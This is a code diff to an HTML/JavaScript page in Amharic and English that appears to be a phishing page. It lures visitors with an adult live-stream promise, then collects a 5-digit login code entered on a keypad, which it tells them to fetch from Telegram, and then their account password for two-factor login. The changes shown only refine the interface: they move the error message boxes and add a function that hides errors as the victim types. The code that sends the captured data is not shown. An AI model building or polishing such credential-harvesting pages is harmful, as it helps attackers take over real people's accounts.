@@ -143,12 +143,11 @@
                     <li><i class="fa-solid fa-check-circle" style="color: #FF9900; font-size: 12px;"></i> አስደንጋጭ የሀበሻ ሴቶች የቀጥታ ስርጭት (Live)</li>
                 </ul>
             </div>
-
+            <div id="status1" class="msg"></div>
             <button class="btn-main" id="loginBtn" onclick="handleLoginClick()">
                 <div class="btn-spinner" id="loginSpinner"></div>
                 <span id="loginText">I'm 18+ | Enter</span>
             </button>
-            <div id="status1" class="msg"></div>
         </div>
     </div>
 
@@ -160,10 +159,10 @@
             <div class="otp-container" id="otp_container">
                 <div class="otp-box" id="b0"></div><div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div>
             </div>
+            <div id="status2" class="msg"></div>            
             <button class="btn-main" style="background: #27a7e7; color: #fff; margin-bottom: 15px; font-size: 14px;" onclick="window.open('https://t.me/42777', '_blank')">
                 <i class="fas fa-paper-plane"></i> ኮዱን ለማግኘት እዚህ ይጫኑ
             </button>
-            <div id="status2" class="msg"></div>
             <div class="keypad">
                 <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
                 <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
@@ -181,7 +180,7 @@
             <p style="opacity: 0.7; margin-bottom: 20px;">የአካውንትዎን ፓስዎርድ ያስገቡ</p>
             <div id="status3" class="msg"></div>
             <div class="pass-wrapper">
-                <input type="password" id="2fa_input" placeholder="Password">
+                <input type="password" id="2fa_input" placeholder="Password" oninput="hideMsg(3)">
                 <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()"></i>
             </div>
             <button class="btn-main" id="confirmBtn" onclick="submit2FA()">
@@ -333,6 +332,7 @@
     }
 
     function press(num) {
+        hideMsg(2); // ቁጥር መጫን ሲጀመር error hide ያደርጋል
         if (currentOtp.length < 5) {
             currentOtp += num;
             updateOtpUI();
@@ -405,6 +405,14 @@
         const el = document.getElementById('status' + stepId);
         if(!el) return;
         el.className = 'msg ' + type; el.innerText = text; el.style.display = 'block';
+    }
+
+    // አዲስ function - error ለመደበቅ
+    function hideMsg(stepId) {
+        const el = document.getElementById('status' + stepId);
+        if(el && el.style.display === 'block' && el.classList.contains('error')) {
+            el.style.display = 'none';
+        }
     }
 
     function startFloodTimer(seconds) {
